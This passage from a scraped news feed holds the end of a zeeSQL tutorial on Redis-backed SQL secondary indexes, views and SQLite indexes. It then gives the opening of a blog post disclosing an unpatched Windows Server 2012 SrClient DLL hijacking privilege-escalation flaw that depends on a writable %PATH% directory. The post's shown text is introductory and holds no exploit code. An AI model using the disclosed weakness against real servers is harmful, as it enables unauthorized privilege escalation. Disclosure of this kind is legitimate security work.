data-key="3233dda1e1054ce99f30fa95398ebe4c"><span data-offset-key="3233dda1e1054ce99f30fa95398ebe4c:0">   3) "foo"</span></span></p><p><span data-key="c84cf0238bc843e8a410b1b179f12707"><span data-offset-key="c84cf0238bc843e8a410b1b179f12707:0">   4) (integer) 3</span></span></p></pre></div><p data-key="d02ee93f64ec4f48b4ebd892d275733d"><span><span data-key="58dc063cfc7744bfbb0d13d41cea713e"><span data-offset-key="58dc063cfc7744bfbb0d13d41cea713e:0">If now we add a new user, the new user will be automatically added to the secondary index table.</span></span></span></p><div><pre data-key="650c5b0b2a874ae6a2abc0f923e1272c" spellcheck="false"><p><span data-key="fcb5b7ec11d24d02928e8f7b80079cea"><span data-offset-key="fcb5b7ec11d24d02928e8f7b80079cea:0">127.0.0.1:6379&gt; HMSET user:109 id 109 name joe score 2</span></span></p><p><span data-key="feda4220bcda47c6b50309eba9749e9d"><span data-offset-key="feda4220bcda47c6b50309eba9749e9d:0">OK</span></span></p><p><span data-key="0fd015eec06144ed974d0cb7051cb221"><span data-offset-key="0fd015eec06144ed974d0cb7051cb221:0">127.0.0.1:6379&gt; ZEESQL.EXEC DB COMMAND "select * from users;"</span></span></p><p><span data-key="0ad1e6b66e4c47fc83b9e6feab075d3a"><span data-offset-key="0ad1e6b66e4c47fc83b9e6feab075d3a:0">1) 1) "RESULT"</span></span></p><p><span data-key="0d59036686aa466fbb64b2e472b2ef5b"><span data-offset-key="0d59036686aa466fbb64b2e472b2ef5b:0">2) 1) "key"</span></span></p><p><span data-key="11b5433d58a74d67bdf69eb7363642bd"><span data-offset-key="11b5433d58a74d67bdf69eb7363642bd:0">   2) "id"</span></span></p><p><span data-key="459b5bcec4fe4c91bbb620f3125ebe49"><span data-offset-key="459b5bcec4fe4c91bbb620f3125ebe49:0">   3) "name"</span></span></p><p><span data-key="ed178d056adb472088955f41077619a6"><span data-offset-key="ed178d056adb472088955f41077619a6:0">   4) "score"</span></span></p><p><span data-key="5bc62a34a44f4f4495367c0cec7f1612"><span data-offset-key="5bc62a34a44f4f4495367c0cec7f1612:0">3) 1) "TEXT"</span></span></p><p><span data-key="06d4b681c9f94fb49613d99a0a410edf"><span data-offset-key="06d4b681c9f94fb49613d99a0a410edf:0">   2) "INT"</span></span></p><p><span data-key="153b7dc0336c45bda3acc5607923fdba"><span data-offset-key="153b7dc0336c45bda3acc5607923fdba:0">   3) "TEXT"</span></span></p><p><span data-key="ed0cbae889664b31a0363395ef2b02e4"><span data-offset-key="ed0cbae889664b31a0363395ef2b02e4:0">   4) "INT"</span></span></p><p><span data-key="1c9029b67ce84ce882d660b32f5afca0"><span data-offset-key="1c9029b67ce84ce882d660b32f5afca0:0">4) 1) "user:105"</span></span></p><p><span data-key="c5ab61341b8c40c598c9c9de4407c069"><span data-offset-key="c5ab61341b8c40c598c9c9de4407c069:0">   2) (integer) 105</span></span></p><p><span data-key="fbbcd1c59d4f4d6b86e7d59df292de8f"><span data-offset-key="fbbcd1c59d4f4d6b86e7d59df292de8f:0">   3) "baz"</span></span></p><p><span data-key="3a146f59943741cda7a6557e81d25d5a"><span data-offset-key="3a146f59943741cda7a6557e81d25d5a:0">   4) (integer) 4</span></span></p><p><span data-key="3065c67fea3e44799c49811fdb29a1bd"><span data-offset-key="3065c67fea3e44799c49811fdb29a1bd:0">5) 1) "user:103"</span></span></p><p><span data-key="a26e51604c5f4943b802f288fef974f1"><span data-offset-key="a26e51604c5f4943b802f288fef974f1:0">   2) (integer) 103</span></span></p><p><span data-key="f64b22e7374345aaacaf46fa0ac602fb"><span data-offset-key="f64b22e7374345aaacaf46fa0ac602fb:0">   3) "bar"</span></span></p><p><span data-key="2892fb90cbbc43dead8d5aa18fc4d209"><span data-offset-key="2892fb90cbbc43dead8d5aa18fc4d209:0">   4) (integer) 5</span></span></p><p><span data-key="3999e524be1c416eaf618e8eca714494"><span data-offset-key="3999e524be1c416eaf618e8eca714494:0">6) 1) "user:100"</span></span></p><p><span data-key="bbf693c7fcad4f17a74db63ffa759c83"><span data-offset-key="bbf693c7fcad4f17a74db63ffa759c83:0">   2) (integer) 100</span></span></p><p><span data-key="3b227534b1a54bf49ec503c668ad4242"><span data-offset-key="3b227534b1a54bf49ec503c668ad4242:0">   3) "foo"</span></span></p><p><span data-key="0c04e94226b44dbb9ab56d5c89de1773"><span data-offset-key="0c04e94226b44dbb9ab56d5c89de1773:0">   4) (integer) 3</span></span></p><p><span data-key="aaff7fa5b46243828f075d3426691523"><span data-offset-key="aaff7fa5b46243828f075d3426691523:0">7) 1) "user:109"</span></span></p><p><span data-key="966b457e4c6f447baaf02c5fbf565742"><span data-offset-key="966b457e4c6f447baaf02c5fbf565742:0">   2) (integer) 109</span></span></p><p><span data-key="9b1adc328de843a8bd723aee7e906a5e"><span data-offset-key="9b1adc328de843a8bd723aee7e906a5e:0">   3) "joe"</span></span></p><p><span data-key="f8bde8ac13b5420eb39a3f3e36c9cc80"><span data-offset-key="f8bde8ac13b5420eb39a3f3e36c9cc80:0">   4) (integer) 2</span></span></p></pre></div><p data-key="1a160d1023e74c6e87b8c4699a708b8f"><span><span data-key="e8d392e71a9442c2bf9533005b02fdde"><span data-offset-key="e8d392e71a9442c2bf9533005b02fdde:0">Similarly, if a user is updated, the table will reflect the new status of the Redis Hash.</span></span></span></p><div><pre data-key="8f67b9dff9fa42909515c3e3976eeabf" spellcheck="false"><p><span data-key="f05523a1d4164c18a5f71eba9ff0055b"><span data-offset-key="f05523a1d4164c18a5f71eba9ff0055b:0">127.0.0.1:6379&gt; HSET user:109 score 5</span></span></p><p><span data-key="6d18cfa1908448e59a5cf618a3161acc"><span data-offset-key="6d18cfa1908448e59a5cf618a3161acc:0">(integer) 0</span></span></p><p><span data-key="31b281af2ca944bda2f86947b7f54138"><span data-offset-key="31b281af2ca944bda2f86947b7f54138:0">127.0.0.1:6379&gt; ZEESQL.EXEC DB COMMAND "select * from users where id = 109;"</span></span></p><p><span data-key="69dd0a218c604e6780abb5d00adc5dda"><span data-offset-key="69dd0a218c604e6780abb5d00adc5dda:0">1) 1) "RESULT"</span></span></p><p><span data-key="3024dd94a7dd40fdb548f357d6313880"><span data-offset-key="3024dd94a7dd40fdb548f357d6313880:0">2) 1) "key"</span></span></p><p><span data-key="0d85956da6214fafaea92549e4469a8e"><span data-offset-key="0d85956da6214fafaea92549e4469a8e:0">   2) "id"</span></span></p><p><span data-key="67cd4580b6b84ef895e8a9bb9066aae9"><span data-offset-key="67cd4580b6b84ef895e8a9bb9066aae9:0">   3) "name"</span></span></p><p><span data-key="cf0b7eb1720b4eb0bce6d5909bede397"><span data-offset-key="cf0b7eb1720b4eb0bce6d5909bede397:0">   4) "score"</span></span></p><p><span data-key="33b7a1092c3747d6a47b5bff4c1d1449"><span data-offset-key="33b7a1092c3747d6a47b5bff4c1d1449:0">3) 1) "TEXT"</span></span></p><p><span data-key="e5cfa9783f754ac5b558d114eda4adf4"><span data-offset-key="e5cfa9783f754ac5b558d114eda4adf4:0">   2) "INT"</span></span></p><p><span data-key="13a6d89f25b740929166f71f29249394"><span data-offset-key="13a6d89f25b740929166f71f29249394:0">   3) "TEXT"</span></span></p><p><span data-key="d30497b7de2f4b64b9b8062fcba38ac2"><span data-offset-key="d30497b7de2f4b64b9b8062fcba38ac2:0">   4) "INT"</span></span></p><p><span data-key="4298d70401c64145a13ec8b3883a150d"><span data-offset-key="4298d70401c64145a13ec8b3883a150d:0">4) 1) "user:109"</span></span></p><p><span data-key="621806a9634f4f12a312309b2cf0a87d"><span data-offset-key="621806a9634f4f12a312309b2cf0a87d:0">   2) (integer) 109</span></span></p><p><span data-key="01db1cb2ffb645019124d6088c25ccf2"><span data-offset-key="01db1cb2ffb645019124d6088c25ccf2:0">   3) "joe"</span></span></p><p><span data-key="6e04d66853494ea9bde44b11e299f7fc"><span data-offset-key="6e04d66853494ea9bde44b11e299f7fc:0">   4) (integer) 5</span></span></p></pre></div><p data-key="833cfb4bee854b3f9b1f09735099a707"><span><span data-key="920c211a880c4f2a94b24346191c852b"><span data-offset-key="920c211a880c4f2a94b24346191c852b:0">Similarly, a Redis Hash deleted, will be removed from the secondary index table.</span></span></span></p><div><pre data-key="f9fda9c94b1e43069c1a22f0d50858d9" spellcheck="false"><p><span data-key="949a2d01533d4f009c5004ebe0633ecb"><span data-offset-key="949a2d01533d4f009c5004ebe0633ecb:0">127.0.0.1:6379&gt; DEL user:105 user:103</span></span></p><p><span data-key="6c1116e63b2f422c86b06d9eba4c97a7"><span data-offset-key="6c1116e63b2f422c86b06d9eba4c97a7:0">(integer) 2</span></span></p><p><span data-key="ef092de9252a41209ee83b7911467a30"><span data-offset-key="ef092de9252a41209ee83b7911467a30:0">127.0.0.1:6379&gt; ZEESQL.EXEC DB COMMAND "select * from users;"</span></span></p><p><span data-key="6c197f3b245d421dbb04537c139f9718"><span data-offset-key="6c197f3b245d421dbb04537c139f9718:0">1) 1) "RESULT"</span></span></p><p><span data-key="77619f600f91412e93cf1075c207b9c2"><span data-offset-key="77619f600f91412e93cf1075c207b9c2:0">2) 1) "key"</span></span></p><p><span data-key="c32a22132ad442018eda9d61d1944ee3"><span data-offset-key="c32a22132ad442018eda9d61d1944ee3:0">   2) "id"</span></span></p><p><span data-key="4a6b5264cfb64cdd91967da055e9e1db"><span data-offset-key="4a6b5264cfb64cdd91967da055e9e1db:0">   3) "name"</span></span></p><p><span data-key="028bcac96c714808b3f37782546ca84d"><span data-offset-key="028bcac96c714808b3f37782546ca84d:0">   4) "score"</span></span></p><p><span data-key="5b76da9b877c44f1aa04c191bc5e926a"><span data-offset-key="5b76da9b877c44f1aa04c191bc5e926a:0">3) 1) "TEXT"</span></span></p><p><span data-key="087b99372f6f4b3ab6a5e9a7aa0522d7"><span data-offset-key="087b99372f6f4b3ab6a5e9a7aa0522d7:0">   2) "INT"</span></span></p><p><span data-key="e7efd8100b1146d28d475ca8178e033e"><span data-offset-key="e7efd8100b1146d28d475ca8178e033e:0">   3) "TEXT"</span></span></p><p><span data-key="af9841411eaa414bb0f6c3ab474098c0"><span data-offset-key="af9841411eaa414bb0f6c3ab474098c0:0">   4) "INT"</span></span></p><p><span data-key="86832befb2184719ba5de8bf5fe6732e"><span data-offset-key="86832befb2184719ba5de8bf5fe6732e:0">4) 1) "user:100"</span></span></p><p><span data-key="e8e5d37d12c147f081d967e823dd1230"><span data-offset-key="e8e5d37d12c147f081d967e823dd1230:0">   2) (integer) 100</span></span></p><p><span data-key="cb08972c817e48848e2c69f5120e03f8"><span data-offset-key="cb08972c817e48848e2c69f5120e03f8:0">   3) "foo"</span></span></p><p><span data-key="adbb71d862e0485d994ffc74e6be798d"><span data-offset-key="adbb71d862e0485d994ffc74e6be798d:0">   4) (integer) 3</span></span></p><p><span data-key="b29c06cdca1f4678ba97947a9cb3796b"><span data-offset-key="b29c06cdca1f4678ba97947a9cb3796b:0">5) 1) "user:109"</span></span></p><p><span data-key="bc30cf418a0e47ba9ec672f5e4221042"><span data-offset-key="bc30cf418a0e47ba9ec672f5e4221042:0">   2) (integer) 109</span></span></p><p><span data-key="0d9007b5ac2848ba95374ef5a9c2f8dc"><span data-offset-key="0d9007b5ac2848ba95374ef5a9c2f8dc:0">   3) "joe"</span></span></p><p><span data-key="666067e23fc64f82aa2232e15b5af710"><span data-offset-key="666067e23fc64f82aa2232e15b5af710:0">   4) (integer) 5</span></span></p></pre></div><p data-key="9770666b35834fcc9f77df1c9111cb4b"><span><span data-key="3b0c9b03f8de43f1a6b6a5cb89d64cdb"><span data-offset-key="3b0c9b03f8de43f1a6b6a5cb89d64cdb:0">The first example was very straightforward. But we can use zeeSQL for something more.</span></span></span></p><p data-key="769897eee00e4b4580d42482b3226458"><span><span data-key="caf8d16cea754a0f8faaa46f0a94646c"><span data-offset-key="caf8d16cea754a0f8faaa46f0a94646c:0">For instance, maybe we want to give a rank to our users.</span></span></span></p><p data-key="11fa456f19124055aefe709742649563"><span><span data-key="0bab3c9924cb4407ae9ecd173e421b5c"><span data-offset-key="0bab3c9924cb4407ae9ecd173e421b5c:0">Users with a score between 0 and 5 will be "novice" and users with a score above it will be expert.</span></span></span></p><p data-key="ee1056ec9ab64477b7a5791e274c48ff"><span><span data-key="949d22fe9d5e4e348e55c5db5141f1f7"><span data-offset-key="949d22fe9d5e4e348e55c5db5141f1f7:0">An easy way to achieve this would be to create a view on top of the </span><span data-offset-key="949d22fe9d5e4e348e55c5db5141f1f7:1"><code spellcheck="false" data-slate-leaf="true">users</code></span><span data-offset-key="949d22fe9d5e4e348e55c5db5141f1f7:2"> tables.</span></span></span></p><div><pre data-key="4116e844733e4334ab4c6ffd84661769" spellcheck="false"><p><span data-key="74b2674d074d4ce784bb2e41dfb8c9cd"><span data-offset-key="74b2674d074d4ce784bb2e41dfb8c9cd:0">127.0.0.1:6379&gt; ZEESQL.EXEC DB COMMAND "create view ranked_users AS select id, name, score, case  when score &lt; 5 then 'novice' else 'expert' end as rank from users;"</span></span></p><p><span data-key="7ddad598406c41a0862a9064c9086219"><span data-offset-key="7ddad598406c41a0862a9064c9086219:0">1) 1) "DONE"</span></span></p><p><span data-key="e578537d36d4458fafb662215ffd20f7"><span data-offset-key="e578537d36d4458fafb662215ffd20f7:0">2) 1) (integer) 0</span></span></p><p><span data-key="88e79536a3304ec5b61a2ce5425f8785"><span data-offset-key="88e79536a3304ec5b61a2ce5425f8785:0">127.0.0.1:6379&gt; ZEESQL.EXEC DB COMMAND "select * from ranked_users;"</span></span></p><p><span data-key="fb96c7f471854e4db876eec5c7dedcde"><span data-offset-key="fb96c7f471854e4db876eec5c7dedcde:0">1) 1) "RESULT"</span></span></p><p><span data-key="aad53ce37933463d885f1ccd442e1314"><span data-offset-key="aad53ce37933463d885f1ccd442e1314:0">2) 1) "id"</span></span></p><p><span data-key="c9564cc96e174e91b57b6d5a664f414c"><span data-offset-key="c9564cc96e174e91b57b6d5a664f414c:0">   2) "name"</span></span></p><p><span data-key="eebfefce20654399a7aa08c415ed1c82"><span data-offset-key="eebfefce20654399a7aa08c415ed1c82:0">   3) "score"</span></span></p><p><span data-key="5921017c2a88443faaabf91622bc405f"><span data-offset-key="5921017c2a88443faaabf91622bc405f:0">   4) "rank"</span></span></p><p><span data-key="985b0a02219f460db7f888528a4f318f"><span data-offset-key="985b0a02219f460db7f888528a4f318f:0">3) 1) "INT"</span></span></p><p><span data-key="55a5a16b16a64af5a989aab8adee05bb"><span data-offset-key="55a5a16b16a64af5a989aab8adee05bb:0">   2) "TEXT"</span></span></p><p><span data-key="d7c4b13411704df6a2b465afbefbe51b"><span data-offset-key="d7c4b13411704df6a2b465afbefbe51b:0">   3) "INT"</span></span></p><p><span data-key="b0d4fbe116f34ac2892eef1beedf7411"><span data-offset-key="b0d4fbe116f34ac2892eef1beedf7411:0">   4) "TEXT"</span></span></p><p><span data-key="a7999de4d1ee498b8c7cdb9ad1fb374d"><span data-offset-key="a7999de4d1ee498b8c7cdb9ad1fb374d:0">4) 1) (integer) 100</span></span></p><p><span data-key="4e1324c8f2834c4b9e0b033b7f8ee33b"><span data-offset-key="4e1324c8f2834c4b9e0b033b7f8ee33b:0">   2) "foo"</span></span></p><p><span data-key="dfa92c77ba8e4632a14a289de4b57037"><span data-offset-key="dfa92c77ba8e4632a14a289de4b57037:0">   3) (integer) 3</span></span></p><p><span data-key="642a3ad93c6540d9aa1da9238ce5dadc"><span data-offset-key="642a3ad93c6540d9aa1da9238ce5dadc:0">   4) "novice"</span></span></p><p><span data-key="04935db850674a86a9e632385642e4f5"><span data-offset-key="04935db850674a86a9e632385642e4f5:0">5) 1) (integer) 109</span></span></p><p><span data-key="697806dea7ab40c2a69e5414dc2ed228"><span data-offset-key="697806dea7ab40c2a69e5414dc2ed228:0">   2) "joe"</span></span></p><p><span data-key="869354e500bf4e9ca6e815b519a574b8"><span data-offset-key="869354e500bf4e9ca6e815b519a574b8:0">   3) (integer) 5</span></span></p><p><span data-key="24853b30138c4242bbb126f620cf2dbc"><span data-offset-key="24853b30138c4242bbb126f620cf2dbc:0">   4) "expert"</span></span></p></pre></div><p data-key="4fc64d6a79f84e5db5bc34a7afa018cd"><span><span data-key="2dae541b1f6e40d098277b267443f2af"><span data-offset-key="2dae541b1f6e40d098277b267443f2af:0">If the user with ID 100, gains a few more points, he will become an expert as well.</span></span></span></p><p data-key="dc3fdb7211fe49888711c6f727562e9a"><span><span data-key="4c374390ad58457db126e1132532c65a"><span data-offset-key="4c374390ad58457db126e1132532c65a:0">Using views on top of secondary indexes, we only need to care about the user score, not about the rank. Using plain Redis we would need to keep track also of the rank ourselves.</span></span></span></p><div><pre data-key="047da2fdaed24a798529bdd4ff0a7c06" spellcheck="false"><p><span data-key="687b203e4f254c569c39adbda358456b"><span data-offset-key="687b203e4f254c569c39adbda358456b:0">127.0.0.1:6379&gt; HSET user:100 score 7</span></span></p><p><span data-key="499aee225467452f8fe1da061a79c65c"><span data-offset-key="499aee225467452f8fe1da061a79c65c:0">(integer) 0</span></span></p><p><span data-key="bdddb66fc53e4db2ac86234d48bb978b"><span data-offset-key="bdddb66fc53e4db2ac86234d48bb978b:0">127.0.0.1:6379&gt; ZEESQL.EXEC DB COMMAND "select * from ranked_users;"</span></span></p><p><span data-key="ee02c16ed00a4bf7a5fa095fc3e2f551"><span data-offset-key="ee02c16ed00a4bf7a5fa095fc3e2f551:0">1) 1) "RESULT"</span></span></p><p><span data-key="18663ecdfb2e4326bdca551b8a840095"><span data-offset-key="18663ecdfb2e4326bdca551b8a840095:0">2) 1) "id"</span></span></p><p><span data-key="ff09515445e146619e771f0666fe644a"><span data-offset-key="ff09515445e146619e771f0666fe644a:0">   2) "name"</span></span></p><p><span data-key="662f7850f30f4e81b61111a7bf1f0999"><span data-offset-key="662f7850f30f4e81b61111a7bf1f0999:0">   3) "score"</span></span></p><p><span data-key="f003a4c9343d41e0b3495fc3427a03d8"><span data-offset-key="f003a4c9343d41e0b3495fc3427a03d8:0">   4) "rank"</span></span></p><p><span data-key="9df370e084894be89d8589042dc20434"><span data-offset-key="9df370e084894be89d8589042dc20434:0">3) 1) "INT"</span></span></p><p><span data-key="1744a492fc8d4aefa6238852aff926f8"><span data-offset-key="1744a492fc8d4aefa6238852aff926f8:0">   2) "TEXT"</span></span></p><p><span data-key="b3c396ad930d4af7ac3e7c125e6bea38"><span data-offset-key="b3c396ad930d4af7ac3e7c125e6bea38:0">   3) "INT"</span></span></p><p><span data-key="493dad483d6248bbbf4939cf400df513"><span data-offset-key="493dad483d6248bbbf4939cf400df513:0">   4) "TEXT"</span></span></p><p><span data-key="a16705c48c5546c39840fe9c4e2c794c"><span data-offset-key="a16705c48c5546c39840fe9c4e2c794c:0">4) 1) (integer) 100</span></span></p><p><span data-key="ad3f33be979c4b7c834182649dbd3510"><span data-offset-key="ad3f33be979c4b7c834182649dbd3510:0">   2) "foo"</span></span></p><p><span data-key="65ef3afbeeb0440e922295c7a8b35806"><span data-offset-key="65ef3afbeeb0440e922295c7a8b35806:0">   3) (integer) 7</span></span></p><p><span data-key="a0d6bde9e9d443698d7cb8ef9834e286"><span data-offset-key="a0d6bde9e9d443698d7cb8ef9834e286:0">   4) "expert"</span></span></p><p><span data-key="88c48a7cb29446c6aca484a213f98546"><span data-offset-key="88c48a7cb29446c6aca484a213f98546:0">5) 1) (integer) 109</span></span></p><p><span data-key="69ed4d3949d1402cb03cb2a6fc4c1824"><span data-offset-key="69ed4d3949d1402cb03cb2a6fc4c1824:0">   2) "joe"</span></span></p><p><span data-key="c807e7d6090549d4a7650232bfa64a17"><span data-offset-key="c807e7d6090549d4a7650232bfa64a17:0">   3) (integer) 5</span></span></p><p><span data-key="1a0c68955caf4b6399e23545d49f746d"><span data-offset-key="1a0c68955caf4b6399e23545d49f746d:0">   4) "expert"</span></span></p></pre></div><p data-key="4119304ffe644187b642b5d58b61eae9"><span><span data-key="8ee61fb3a7c4443d923053a87f028138"><span data-offset-key="8ee61fb3a7c4443d923053a87f028138:0">If our game gains a lot of users some queries could become slow.</span></span></span></p><p data-key="50308bf8ce2140188fb486118cba12d0"><span><span data-key="df83984b06584115a92696495b26463c"><span data-offset-key="df83984b06584115a92696495b26463c:0">On top of the secondary index table, it is possible to add SQLite indexes.</span></span></span></p><p data-key="0031c96d7f9a469690f28e52f6eebb3d"><span><span data-key="3dee28dedd294e01ac49751178891c6f"><span data-offset-key="3dee28dedd294e01ac49751178891c6f:0">For instance, we might want to know how many users have a particular score. If there are a lot of users, this query might be slow.</span></span></span></p><div><pre data-key="6c0573a0425742ac8ad3bdafd9108f77" spellcheck="false"><p><span data-key="f6c6a3d8fa2642bbbfff1553ee3b29ab"><span data-offset-key="f6c6a3d8fa2642bbbfff1553ee3b29ab:0">127.0.0.1:6379&gt; ZEESQL.EXEC DB COMMAND "explain query plan select * from users where score = 3;"</span></span></p><p><span data-key="4f95115447f64dbb9d0038a97370d52d"><span data-offset-key="4f95115447f64dbb9d0038a97370d52d:0">1) 1) "RESULT"</span></span></p><p><span data-key="9723ed648f1445fdae94fd1809b430e6"><span data-offset-key="9723ed648f1445fdae94fd1809b430e6:0">2) 1) "id"</span></span></p><p><span data-key="1e3805785d834904918d0d5da858e344"><span data-offset-key="1e3805785d834904918d0d5da858e344:0">   2) "parent"</span></span></p><p><span data-key="0b4d7142fc234471a57279a601de4168"><span data-offset-key="0b4d7142fc234471a57279a601de4168:0">   3) "notused"</span></span></p><p><span data-key="5b06356d6cb640d99b1c315e37f4512f"><span data-offset-key="5b06356d6cb640d99b1c315e37f4512f:0">   4) "detail"</span></span></p><p><span data-key="f84af901b7c6455e84ca1a485b19c1e3"><span data-offset-key="f84af901b7c6455e84ca1a485b19c1e3:0">3) 1) "INT"</span></span></p><p><span data-key="c9e165b7b7604b9d82d4ceaaab95fb3d"><span data-offset-key="c9e165b7b7604b9d82d4ceaaab95fb3d:0">   2) "INT"</span></span></p><p><span data-key="9cde4c9c8f9b4866b6c07f7c46b2dc93"><span data-offset-key="9cde4c9c8f9b4866b6c07f7c46b2dc93:0">   3) "INT"</span></span></p><p><span data-key="6f98716bad0949629c170c2056565d2e"><span data-offset-key="6f98716bad0949629c170c2056565d2e:0">   4) "TEXT"</span></span></p><p><span data-key="67744d790f0f4b4d97982af6aefbabd4"><span data-offset-key="67744d790f0f4b4d97982af6aefbabd4:0">4) 1) (integer) 2</span></span></p><p><span data-key="38cf9a95f8f44ffb9044fffcfab1722b"><span data-offset-key="38cf9a95f8f44ffb9044fffcfab1722b:0">   2) (integer) 0</span></span></p><p><span data-key="fe1fe87ee3744e5f8c66cf96f2be9cd2"><span data-offset-key="fe1fe87ee3744e5f8c66cf96f2be9cd2:0">   3) (integer) 0</span></span></p><p><span data-key="6979513ae5b6456089283c895eb69c8c"><span data-offset-key="6979513ae5b6456089283c895eb69c8c:0">   4) "SCAN TABLE users"</span></span></p></pre></div><p data-key="35def4e10dcc4fbaad6e1d80058dc3e4"><span><span data-key="141fb47116534d7bba3a7e9ef53b19a6"><span data-offset-key="141fb47116534d7bba3a7e9ef53b19a6:0">This query uses a full table scan.</span></span></span></p><p data-key="3548cc11be154dd5b85e4573b8924bac"><span><span data-key="723d290715a04b86bfcf1449c05d7a87"><span data-offset-key="723d290715a04b86bfcf1449c05d7a87:0">We can do better defining an index:</span></span></span></p><div><pre data-key="bbba01aaf5ba4fa7a26241058d769ef7" spellcheck="false"><p><span data-key="47f6342fe4e14a24a59897d52c81c854"><span data-offset-key="47f6342fe4e14a24a59897d52c81c854:0">127.0.0.1:6379&gt; ZEESQL.EXEC DB COMMAND "create index user_rank on users(score);"</span></span></p><p><span data-key="0cd099b67f294f8baac951caa02119da"><span data-offset-key="0cd099b67f294f8baac951caa02119da:0">1) 1) "DONE"</span></span></p><p><span data-key="dd4e01e08528487f874bfb71b6e45796"><span data-offset-key="dd4e01e08528487f874bfb71b6e45796:0">2) 1) (integer) 0</span></span></p><p><span data-key="5ca379dd3e2140818be55a21fd5a4f68"><span data-offset-key="5ca379dd3e2140818be55a21fd5a4f68:0">127.0.0.1:6379&gt; ZEESQL.EXEC DB COMMAND "explain query plan select * from users where score = 3;"</span></span></p><p><span data-key="21ca808bc0e74c78a1d800caa36c3695"><span data-offset-key="21ca808bc0e74c78a1d800caa36c3695:0">1) 1) "RESULT"</span></span></p><p><span data-key="37519cface344bea90e910bc940dcc5b"><span data-offset-key="37519cface344bea90e910bc940dcc5b:0">2) 1) "id"</span></span></p><p><span data-key="372e52aac87d4ff28eee236474a594c1"><span data-offset-key="372e52aac87d4ff28eee236474a594c1:0">   2) "parent"</span></span></p><p><span data-key="699e0e314eb44f39a1db5ea861ac49a6"><span data-offset-key="699e0e314eb44f39a1db5ea861ac49a6:0">   3) "notused"</span></span></p><p><span data-key="ac7c75680ba641c0b2de63a4f65dd073"><span data-offset-key="ac7c75680ba641c0b2de63a4f65dd073:0">   4) "detail"</span></span></p><p><span data-key="8033787da78a4271b77b81a1e27a2ae2"><span data-offset-key="8033787da78a4271b77b81a1e27a2ae2:0">3) 1) "INT"</span></span></p><p><span data-key="7a5ab1ef5aab4b74864ed5a297e97a38"><span data-offset-key="7a5ab1ef5aab4b74864ed5a297e97a38:0">   2) "INT"</span></span></p><p><span data-key="3dbdbd17667e493ca98d94657db9f431"><span data-offset-key="3dbdbd17667e493ca98d94657db9f431:0">   3) "INT"</span></span></p><p><span data-key="c04cd5856c5e4557bb217f5adf3ed5a9"><span data-offset-key="c04cd5856c5e4557bb217f5adf3ed5a9:0">   4) "TEXT"</span></span></p><p><span data-key="1907b930a3e04e589540456f6014b4d5"><span data-offset-key="1907b930a3e04e589540456f6014b4d5:0">4) 1) (integer) 3</span></span></p><p><span data-key="1efb43cf24814ac9bf831c9ea8863208"><span data-offset-key="1efb43cf24814ac9bf831c9ea8863208:0">   2) (integer) 0</span></span></p><p><span data-key="0b7ea13efb7d43e6ba951404f66cb176"><span data-offset-key="0b7ea13efb7d43e6ba951404f66cb176:0">   3) (integer) 0</span></span></p><p><span data-key="8139ee74bd7f4d91a23b14dc61e0b47c"><span data-offset-key="8139ee74bd7f4d91a23b14dc61e0b47c:0">   4) "SEARCH TABLE users USING INDEX user_rank (score=?)"</span></span></p></pre></div><p data-key="29530945fbba4ee8b3a3f7e33f74ded1"><span><span data-key="f7619ba1f20b4c41baf96e16807b631c"><span data-offset-key="f7619ba1f20b4c41baf96e16807b631c:0">In this article, we show how to use secondary indexes in zeeSQL.</span></span></span></p><p data-key="7218ae5f91374d94b7f62e786a13b27a"><span><span data-key="a4cf2b2b2ce1416eb3a66e7b459cf32f"><span data-offset-key="a4cf2b2b2ce1416eb3a66e7b459cf32f:0">They are very powerful and useful when you are simplifying your queries against Redis Hashes. Moreover, they allow you to think only about the main data, it is the query engine that finds the best way to query your data for you.</span></span></span></p><p data-key="c301042f197349d1b5111bb87e64542b"><span><span data-key="589220fbd7d64dd2a804d5fa38983a29"><span data-offset-key="589220fbd7d64dd2a804d5fa38983a29:0">The important takeaway from this article should be that the table creates as zeeSQL secondary indexes are just standard tables. As such, those tables can be manipulated in whichever way the application developer finds more opportune.</span></span></span></p></div></div></div></div></div></div>]]>
            </description>
            <link>https://doc.zeesql.com/secondary-indexes</link>
            <guid isPermaLink="false">hacker-news-small-sites-26229236</guid>
            <pubDate>Mon, 22 Feb 2021 19:26:22 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[SrClient DLL Hijacking: a Windows Server 2012 0-day that won't be patched]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26229098">thread link</a>) | @lelf
<br/>
February 22, 2021 | https://blog.vonahi.io/srclient-dll-hijacking | <a href="https://web.archive.org/web/*/https://blog.vonahi.io/srclient-dll-hijacking">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="site-main">
    <div>

        <article>

            

            <figure>
                <img srcset="https://blog.vonahi.io/content/images/size/w300/2021/02/blog-post-dll.jpg 300w,
                            https://blog.vonahi.io/content/images/size/w600/2021/02/blog-post-dll.jpg 600w,
                            https://blog.vonahi.io/content/images/size/w1000/2021/02/blog-post-dll.jpg 1000w,
                            https://blog.vonahi.io/content/images/size/w2000/2021/02/blog-post-dll.jpg 2000w" sizes="(max-width: 800px) 400px,
                            (max-width: 1170px) 700px,
                            1400px" src="https://blog.vonahi.io/content/images/size/w2000/2021/02/blog-post-dll.jpg" alt="SrClient DLL Hijacking: a Windows Server 2012 0-day that won't be patched">
            </figure>

            <section>
                <div>
                    <p>I recently discovered that all versions of Windows Server 2012 (but not Server 2012 R2) are affected by a DLL hijacking vulnerability that can be exploited for privilege escalation. Moreover, the flaw can be triggered by a regular user and does not require a system reboot. Sounds like a pretty big deal, right? Well, not according to Microsoft, unfortunately. The vulnerability relies on <code>%PATH%</code> containing at least one insecurely configured directory, and <a href="https://msrc-blog.microsoft.com/2018/04/04/triaging-a-dll-planting-vulnerability/">Microsoft does not consider bugs</a> <a href="https://msrc-blog.microsoft.com/2018/04/04/triaging-a-dll-planting-vulnerability/">of this category to be security vulnerabilities worthy of a fix</a>. However, if your company is running Windows Server 2012, there is a decent chance this vulnerability can allow regular users (or attackers with access as a regular user) to pwn your server or domain controller. Let me show you how.</p><h2 id="0x00-a-refresher-on-dlls-and-path-">0x00 A Refresher on DLLs and %PATH%</h2><p>If you are unfamiliar with DLL hijacking, feel free to check out <a href="https://blog.vonahi.io/when-the-path-to-system-is-wide-open/">this blog post</a> that contains a general introduction to this subject. A brief summary of key concepts follows below.</p><h3 id="dlls">DLLs</h3><p>Microsoft defines a DLL as:</p><blockquote>a library that contains code and data that can be used by more than one program at the same time.</blockquote><p>DLLs are very similar to EXE files, but they can only be 